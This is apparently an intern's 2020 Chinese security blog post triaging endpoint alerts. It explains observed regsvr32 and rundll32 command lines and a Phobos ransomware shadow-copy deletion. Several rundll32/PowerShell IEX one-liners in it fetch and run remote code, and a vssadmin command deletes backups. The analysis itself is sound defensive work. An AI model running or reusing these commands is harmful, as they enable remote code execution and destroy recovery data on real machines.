@@ -1,0 +1,893 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="IOCs记录实习了一周左右，工作内容基本就是复查一些IOCs，挑一些典型的记录下，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="note20200710">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;07&#x2F;10&#x2F;note20200710&#x2F;index.html">
+<meta property="og:site_name" content="Ivoripuion&#39;s blog">
+<meta property="og:description" content="IOCs记录实习了一周左右，工作内容基本就是复查一些IOCs，挑一些典型的记录下，">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;07&#x2F;10&#x2F;note20200710&#x2F;record1.PNG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;07&#x2F;10&#x2F;note20200710&#x2F;record2.PNG">
+<meta property="og:updated_time" content="2020-07-10T14:13:58.980Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;07&#x2F;10&#x2F;note20200710&#x2F;record1.PNG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/07/10/note20200710/"/>
+
+
+
+
+
+  <title>note20200710 | Ivoripuion's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ivoripuion's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-pwn">
+          <a href="/categories/pwn" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            pwn
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-web">
+          <a href="/categories/web" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            web
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-reverse">
+          <a href="/categories/reverse" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            reverse
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-随想">
+          <a href="/categories/%E9%9A%8F%E6%83%B3" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            随想
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/10/note20200710/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ivoripuion">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ivoripuion's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">note20200710</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-07-10T21:43:18+08:00">
+                2020-07-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9A%8F%E6%83%B3/" itemprop="url" rel="index">
+                    <span itemprop="name">随想</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="IOCs记录"><a href="#IOCs记录" class="headerlink" title="IOCs记录"></a>IOCs记录</h1><p>实习了一周左右，工作内容基本就是复查一些IOCs，挑一些典型的记录下，</p>
+<a id="more"></a>
+
+<h1 id="任务内容"><a href="#任务内容" class="headerlink" title="任务内容"></a>任务内容</h1><p>【Regsvr32或Msiexec执行远程脚本】</p>
+<h2 id="GUID"><a href="#GUID" class="headerlink" title="GUID"></a>GUID</h2><p>4d292162cc0e212c3cbb9d4bca587bcd</p>
+<h2 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h2><p>59.49.39.21</p>
+<h2 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h2><p>2020-07-06 16:25:33</p>
+<h2 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h2><p>regsvr32.exe  /s /u /i:<a href="https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct" target="_blank" rel="noopener">https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct</a> scrobj.dll</p>
+<h2 id="附加命令行"><a href="#附加命令行" class="headerlink" title="附加命令行"></a>附加命令行</h2><p>explorer.exe</p>
+<h2 id="用户属性分析："><a href="#用户属性分析：" class="headerlink" title="用户属性分析："></a>用户属性分析：</h2><ul>
+<li>用户所属企业：山西清华网络系统工程有限公司</li>
+</ul>
+<h1 id="附加信息"><a href="#附加信息" class="headerlink" title="附加信息"></a>附加信息</h1><p>{“filemd5s”: [], “user_ip”: “59.49.39.21”, “ips”: [], “urls”: [“/i:<a href="https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct&quot;]" target="_blank" rel="noopener">https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct&quot;]</a>, “domains”: [“”], “input_datetime”: “2020-07-06 16:25:33”, “guid”: “4d292162cc0e212c3cbb9d4bca587bcd”}</p>
+<h1 id="分析结果"><a href="#分析结果" class="headerlink" title="分析结果"></a>分析结果</h1><p>【Regsvr32或Msiexec执行远程脚本】</p>
+<h2 id="GUID-1"><a href="#GUID-1" class="headerlink" title="GUID"></a>GUID</h2><p>4d292162cc0e212c3cbb9d4bca587bcd</p>
+<h2 id="IP-1"><a href="#IP-1" class="headerlink" title="IP"></a>IP</h2><p>59.49.39.21</p>
+<h2 id="时间-1"><a href="#时间-1" class="headerlink" title="时间"></a>时间</h2><p>2020-07-06 16:25:33</p>
+<h2 id="行为"><a href="#行为" class="headerlink" title="行为"></a>行为</h2><p>regsvr32.exe  /s /u /i:<a href="https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct" target="_blank" rel="noopener">https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct</a> scrobj.dll</p>
+<p>附加命令行：explorer.exe</p>
+<h2 id="用户属性分析：-1"><a href="#用户属性分析：-1" class="headerlink" title="用户属性分析："></a>用户属性分析：</h2><ul>
+<li>用户所属企业：山西清华网络系统工程有限公司</li>
+</ul>
+<h1 id="处理"><a href="#处理" class="headerlink" title="处理"></a>处理</h1><p>参考文章：<a href="https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/" target="_blank" rel="noopener">Regsvr32.exe</a></p>
+<h2 id="行为解释"><a href="#行为解释" class="headerlink" title="行为解释"></a>行为解释</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll</span><br></pre></td></tr></table></figure>
+
+<p>regsvr32.exe用于注册DLL或者反注册DLL，本质是注册表的修改。使用scrobj.dll的DllInstall函数，并将url的参数传递过去。</p>
+<p>几个参数的解释：</p>
+<ul>
+<li>/s：不显示对话框，静默模式。</li>
+<li>/u：反注册。</li>
+<li>/i：使用scrobj.dll执行安装的.SCT脚本。</li>
+</ul>
+<h2 id="沙盒动态分析结果"><a href="#沙盒动态分析结果" class="headerlink" title="沙盒动态分析结果"></a>沙盒动态分析结果</h2><p>恶意文件url已经失效了，但也存在注册的行为：</p>
+<p><img src="/2020/07/10/note20200710/record1.PNG" alt></p>
+<p>T1117/RegSvr32.sct的内容：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?XML version=<span class="string">"1.0"</span>?&gt;</span><br><span class="line">&lt;scriptlet&gt;</span><br><span class="line">&lt;registration </span><br><span class="line">    progid=<span class="string">"PoC"</span></span><br><span class="line">    classid=<span class="string">"&#123;F0001111-0000-0000-0000-0000FEEDACDC&#125;"</span> &gt;</span><br><span class="line">	&lt;!-- regsvr32 /s /u /i:http:<span class="comment">//example.com/file.sct scrobj.dll --&gt;</span></span><br><span class="line"></span><br><span class="line">	&lt;!-- .sct files when downloaded, are executed <span class="keyword">from</span> a path like <span class="keyword">this</span> --&gt;</span><br><span class="line">	&lt;!-- Please Note, file extenstion does not matter --&gt;</span><br><span class="line">	&lt;!-- Though, the name and extension are arbitary.. --&gt;</span><br><span class="line">	&lt;!-- c:\users\USER\appdata\local\microsoft\windows\temporary internet files\content.ie5\<span class="number">2</span>vcqsj3k\file[<span class="number">2</span>].sct --&gt;</span><br><span class="line">	&lt;!-- Based on current research, no registry keys are written, since call <span class="string">"uninstall"</span> --&gt;</span><br><span class="line">  	&lt;!-- You can either execute locally, or <span class="keyword">from</span> a url --&gt;</span><br><span class="line">	&lt;script language=<span class="string">"JScript"</span>&gt;</span><br><span class="line">		&lt;![CDATA[</span><br><span class="line">	    		<span class="comment">// calc.exe should launch, this could be any arbitrary code.</span></span><br><span class="line">      	   		<span class="comment">// What you are hoping to catch is the cmdline, modloads, or network connections, or any variation</span></span><br><span class="line">			<span class="keyword">var</span> r = <span class="keyword">new</span> ActiveXObject(<span class="string">"WScript.Shell"</span>).Run(<span class="string">"calc.exe"</span>);	<span class="comment">//cmd 运行 calc.exe</span></span><br><span class="line">	</span><br><span class="line">		]]&gt;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>registration&gt;</span><br><span class="line">&lt;<span class="regexp">/scriptlet&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>简单的测试文件，用于打开一个计算器。</p>
+<p>本地测试结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32.exe  /s /u /i:C:\test\test.sct scrobj.dll</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/10/note20200710/record2.PNG" alt></p>
+<h1 id="任务内容-1"><a href="#任务内容-1" class="headerlink" title="任务内容"></a>任务内容</h1><p>【Rundll32.exe 执行js脚本】</p>
+<p>GUID：570cbada6113c891247cf644b4bfc0a6</p>
+<h2 id="IP-2"><a href="#IP-2" class="headerlink" title="IP"></a>IP</h2><p>183.250.17.47</p>
+<h2 id="时间-2"><a href="#时间-2" class="headerlink" title="时间"></a>时间</h2><p>2020-07-07 10:28:34</p>
+<h2 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h2><ul>
+<li><p>命令行：”C:/Windows/System32/rundll32.exe” javascript:”/../mshtml,RunHTMLApplication “;</p>
+</li>
+<li><p>javascript行为：document.write();h=new%20ActiveXObject(“WinHttp.WinHttpRequest.5.1”);h.Open(“GET”,”<a href="http://192.168.8.70:8080/connect&quot;,false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run" target="_blank" rel="noopener">http://192.168.8.70:8080/connect&quot;,false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run</a>(“cmd /c taskkill /f /im rundll32.exe”,0,true);}</p>
+</li>
+</ul>
+<h1 id="附加信息-1"><a href="#附加信息-1" class="headerlink" title="附加信息"></a>附加信息</h1><p>{“filemd5s”: [], “user_ip”: “183.250.17.47”, “ips”: [], “urls”: [“”], “domains”: [], “input_datetime”: “2020-07-07 10:28:34”, “guid”: “570cbada6113c891247cf644b4bfc0a6”}</p>
+<h1 id="分析结果-1"><a href="#分析结果-1" class="headerlink" title="分析结果"></a>分析结果</h1><h2 id="行为-1"><a href="#行为-1" class="headerlink" title="行为"></a>行为</h2><p>Rundll32.exe 执行js脚本</p>
+<h2 id="GUID-2"><a href="#GUID-2" class="headerlink" title="GUID"></a>GUID</h2><p>570cbada6113c891247cf644b4bfc0a6</p>
+<h2 id="IP-3"><a href="#IP-3" class="headerlink" title="IP"></a>IP</h2><p>183.250.17.47</p>
+<h2 id="时间-3"><a href="#时间-3" class="headerlink" title="时间"></a>时间</h2><p>2020-07-07 10:28:34</p>
+<h2 id="内容-1"><a href="#内容-1" class="headerlink" title="内容"></a>内容</h2><ul>
+<li><p>命令行：”C:/Windows/System32/rundll32.exe” javascript:”/../mshtml,RunHTMLApplication “;</p>
+</li>
+<li><p>函数代码：document.write();h=new%20ActiveXObject(“WinHttp.WinHttpRequest.5.1”);h.Open(“GET”,”<a href="http://192.168.8.70:8080/connect&quot;,false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run" target="_blank" rel="noopener">http://192.168.8.70:8080/connect&quot;,false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run</a>(“cmd /c taskkill /f /im rundll32.exe”,0,true);}</p>
+</li>
+</ul>
+<h2 id="脚本解释"><a href="#脚本解释" class="headerlink" title="脚本解释"></a>脚本解释</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.write();<span class="comment">//文件写入</span></span><br><span class="line">h=<span class="keyword">new</span> ActiveXObject(<span class="string">"WinHttp.WinHttpRequest.5.1"</span>);<span class="comment">//创建一个伪造的http请求</span></span><br><span class="line">h.Open(<span class="string">"GET"</span>,<span class="string">"http://192.168.8.70:8080/connect"</span>,<span class="literal">false</span>);<span class="comment">//从http://192.168.8.70:8080/connect获取数据，false表示同步发生</span></span><br><span class="line"><span class="keyword">try</span>&#123;<span class="comment">//发送请求</span></span><br><span class="line">    h.Send();</span><br><span class="line">    b=h.ResponseText;</span><br><span class="line">    <span class="built_in">eval</span>(b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(e)<span class="comment">//失败kill掉run32.dll进程</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">new</span> ActiveXObject(<span class="string">"WScript.Shell"</span>).Run(<span class="string">"cmd /c taskkill /f /im rundll32.exe"</span>,<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>主机【inurl:183.250.17.47】使用run32dll程序调用js脚本从本地局域网 <a href="http://192.168.8.70:8080/connect" target="_blank" rel="noopener">http://192.168.8.70:8080/connect</a> 获取一个资源，失败则kill掉run32dll进程。<br>基于给出的信息无法得知是正常的下载操作还是下载恶意代码的操作。    </p>
+<h2 id="IOCs平台查询"><a href="#IOCs平台查询" class="headerlink" title="IOCs平台查询"></a>IOCs平台查询</h2><p>微步：2020-04-01目标IP【183.250.17.47】存在撞库操作，但也不能排除误报的可能性。<br>shodan：无有关IP【183.250.17.47】的记录。<br>ALPHA：标记【183.250.17.47】为【WebAttacker】【境内家庭】。<br>zoomeye：无相关IOC信息。</p>
+<h1 id="任务内容-2"><a href="#任务内容-2" class="headerlink" title="任务内容"></a>任务内容</h1><p>【Rundll32.exe 执行js脚本】</p>
+<h2 id="GUID-3"><a href="#GUID-3" class="headerlink" title="GUID"></a>GUID</h2><p>db0cc634cf50bb09a519e3ac10eca4c6</p>
+<h2 id="IP-4"><a href="#IP-4" class="headerlink" title="IP"></a>IP</h2><p>59.37.125.123</p>
+<h2 id="时间-4"><a href="#时间-4" class="headerlink" title="时间"></a>时间</h2><p>2020-06-30 18:56:36</p>
+<h2 id="行为-2"><a href="#行为-2" class="headerlink" title="行为"></a>行为</h2><ul>
+<li>命令行：”C:/Windows/System32/rundll32.exe” javascript    :”/../mshtml,RunHTMLApplication “;document.write();r=new%20ActiveXObject(“WScript.Shell”).run(“powershell%20-WindowStyle%20hidden%20-nologo%20-noprofile%20IEX%20((New-Object%20Net.WebClient).DownloadString(%27<a href="http://192.168.174.129/x.txt%27))&quot;,0,true" target="_blank" rel="noopener">http://192.168.174.129/x.txt%27))&quot;,0,true</a>);</li>
+</ul>
+<h2 id="用户属性分析：-2"><a href="#用户属性分析：-2" class="headerlink" title="用户属性分析："></a>用户属性分析：</h2><ul>
+<li>用户所属企业：深圳市腾讯计算机系统有限公司</li>
+</ul>
+<h1 id="附加信息-2"><a href="#附加信息-2" class="headerlink" title="附加信息"></a>附加信息</h1><p>{“filemd5s”: [], “user_ip”: “59.37.125.123”, “ips”: [“”], “urls”: [“<a href="http://192.168.174.129/x.txt&#39;&quot;]" target="_blank" rel="noopener">http://192.168.174.129/x.txt&#39;&quot;]</a>, “domains”: [], “input_datetime”: “2020-06-30 18:56:36”, “guid”: “db0cc634cf50bb09a519e3ac10eca4c6”}</p>
+<h1 id="分析结果-2"><a href="#分析结果-2" class="headerlink" title="分析结果"></a>分析结果</h1><p>执行命令行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;C:/Windows/System32/rundll32.exe&quot; javascript	:&quot;/../mshtml,RunHTMLApplication &quot;;document.write();r=new ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;powershell -WindowStyle hidden -nologo -noprofile IEX ((New-Object Net.WebClient).DownloadString(&apos;http://192.168.174.129/x.txt&apos;))&quot;,0,true);</span><br></pre></td></tr></table></figure>
+
+<p>即通过rundll32.exe调用html规则运行一段js代码。</p>
+<h2 id="js代码分析"><a href="#js代码分析" class="headerlink" title="js代码分析"></a>js代码分析</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.write();</span><br><span class="line">r = <span class="keyword">new</span> ActiveXObject(<span class="string">"WScript.Shell"</span>).</span><br><span class="line">    run(<span class="string">"powershell -WindowStyle hidden -nologo -noprofile IEX ((New-Object Net.WebClient).DownloadString('http://192.168.174.129/x.txt'))"</span>,<span class="number">0</span>,<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
+
+<p>调用powershell执行命令：从 <a href="http://192.168.174.129/x.txt" target="_blank" rel="noopener">http://192.168.174.129/x.txt</a> 获取指令并执行，一般用于建立反弹shell。</p>
+<h2 id="IOC分析"><a href="#IOC分析" class="headerlink" title="IOC分析"></a>IOC分析</h2><ul>
+<li>virustotal</li>
+</ul>
+<p>分析IP：59.37.125.123为正常IP。</p>
+<ul>
+<li>zoomeye</li>
+</ul>
+<p>分析IP：59.37.125.123无相关标记。</p>
+<ul>
+<li>shodan</li>
+</ul>
+<p>分析IP：59.37.125.123无相关标记。</p>
+<h1 id="任务处理"><a href="#任务处理" class="headerlink" title="任务处理"></a>任务处理</h1><p>【Rundll32.exe 执行js脚本】</p>
+<h2 id="GUID-4"><a href="#GUID-4" class="headerlink" title="GUID"></a>GUID</h2><p>acc3e233151916c46d88ed3312eea52e</p>
+<h2 id="IP-5"><a href="#IP-5" class="headerlink" title="IP"></a>IP</h2><p>113.70.101.92</p>
+<h2 id="时间-5"><a href="#时间-5" class="headerlink" title="时间"></a>时间</h2><p>2020-06-25 00:05:47</p>
+<h2 id="命令行-1"><a href="#命令行-1" class="headerlink" title="命令行"></a>命令行</h2><p>“C:/Windows/System32/rundll32.exe” javascript:”/../mshtml,RunHTMLApplication “;document.write();h=new%20ActiveXObject(“WinHttp.WinHttpRequest.5.1”);h.Open(“GET”,”<a href="http://122.114.85.72:8080/connect&quot;,false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run" target="_blank" rel="noopener">http://122.114.85.72:8080/connect&quot;,false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run</a>(“cmd /c taskkill /f /im rundll32.exe”,0,true);} #1</p>
+<h2 id="处理结果"><a href="#处理结果" class="headerlink" title="处理结果"></a>处理结果</h2><p>rundll32.exe调用js代码。</p>
+<h2 id="javascript代码解释"><a href="#javascript代码解释" class="headerlink" title="javascript代码解释"></a>javascript代码解释</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.write();</span><br><span class="line">h=<span class="keyword">new</span> ActiveXObject(<span class="string">"WinHttp.WinHttpRequest.5.1"</span>);h.Open(<span class="string">"GET"</span>,<span class="string">"http://122.114.85.72:8080/connect"</span>,<span class="literal">false</span>);</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    h.Send();b=h.ResponseText;<span class="built_in">eval</span>(b);</span><br><span class="line">&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">    <span class="keyword">new</span> ActiveXObject(<span class="string">"WScript.Shell"</span>).Run(<span class="string">"cmd /c taskkill /f /im rundll32.exe"</span>,<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line">&#125; #1</span><br></pre></td></tr></table></figure>
+
+<p>伪造http请求头GET请求 <a href="http://122.114.85.72:8080/connect" target="_blank" rel="noopener">http://122.114.85.72:8080/connect</a> ，请求失败则kill掉进程run32dll.exe。</p>
+<h2 id="IOC分析-1"><a href="#IOC分析-1" class="headerlink" title="IOC分析"></a>IOC分析</h2><ul>
+<li><p>shodan：分析IP：59.37.125.123无相关标记。</p>
+</li>
+<li><p>virustotal：分析IP：59.37.125.123一处标记为恶意IP。</p>
+</li>
+<li><p>threatbook：分析IP：59.37.125.123恶意IP。</p>
+</li>
+</ul>
+<h1 id="任务内容-3"><a href="#任务内容-3" class="headerlink" title="任务内容"></a>任务内容</h1><p>【删除卷影操作】</p>
+<h2 id="防御规则ID"><a href="#防御规则ID" class="headerlink" title="防御规则ID"></a>防御规则ID</h2><p>2178</p>
+<h2 id="探针ID"><a href="#探针ID" class="headerlink" title="探针ID"></a>探针ID</h2><p>693</p>
+<h2 id="父MD5"><a href="#父MD5" class="headerlink" title="父MD5"></a>父MD5</h2><p>83ba9164e598edbfc0a7b4ee7a44e155</p>
+<h2 id="父命令行"><a href="#父命令行" class="headerlink" title="父命令行"></a>父命令行</h2><p>C:/PROGRA<del>3/MICROS</del>1/Windows/STARTM<del>1/Programs/Startup/ANTIRE</del>1.EXE</p>
+<h2 id="子MD5"><a href="#子MD5" class="headerlink" title="子MD5"></a>子MD5</h2><p>e23dd973e1444684eb36365deff1fc74</p>
+<h2 id="子命令行"><a href="#子命令行" class="headerlink" title="子命令行"></a>子命令行</h2><p>vssadmin  delete shadows /all /quiet</p>
+<h2 id="广度"><a href="#广度" class="headerlink" title="广度"></a>广度</h2><p>1</p>
+<h1 id="分析结果-3"><a href="#分析结果-3" class="headerlink" title="分析结果"></a>分析结果</h1><h2 id="家族社团分析"><a href="#家族社团分析" class="headerlink" title="家族社团分析"></a>家族社团分析</h2><ul>
+<li>威胁所属家族：phobos</li>
+<li>家族关联路径：release | 83ba9164e598edbfc0a7b4ee7a44e155 -&gt; 1681ffc6e046c7af98c9e6c232a3fe0a -&gt; d341cc4d771c0552d712ea5c21516eae</li>
+</ul>
+<h2 id="传播渠道分析"><a href="#传播渠道分析" class="headerlink" title="传播渠道分析"></a>传播渠道分析</h2><ul>
+<li>父进程：e087e55a60b4547b9d07cd8d8f2a49e3|svchost.com</li>
+</ul>
+<h2 id="处理说明"><a href="#处理说明" class="headerlink" title="处理说明"></a>处理说明</h2><p>使用vssadmin运行删除命令删除卷影副本从而使受害者无法恢复任何已加密的文件。</p>
+<h1 id="任务内容-4"><a href="#任务内容-4" class="headerlink" title="任务内容"></a>任务内容</h1><p>【Rundll32.exe 执行js脚本】</p>
+<h2 id="GUID-5"><a href="#GUID-5" class="headerlink" title="GUID"></a>GUID</h2><p>85524df128b51b4f20d247f19e1c44da</p>
+<h2 id="IP-6"><a href="#IP-6" class="headerlink" title="IP"></a>IP</h2><p>183.197.254.111</p>
+<h2 id="时间-6"><a href="#时间-6" class="headerlink" title="时间"></a>时间</h2><p>2020-06-04 16:25:44</p>
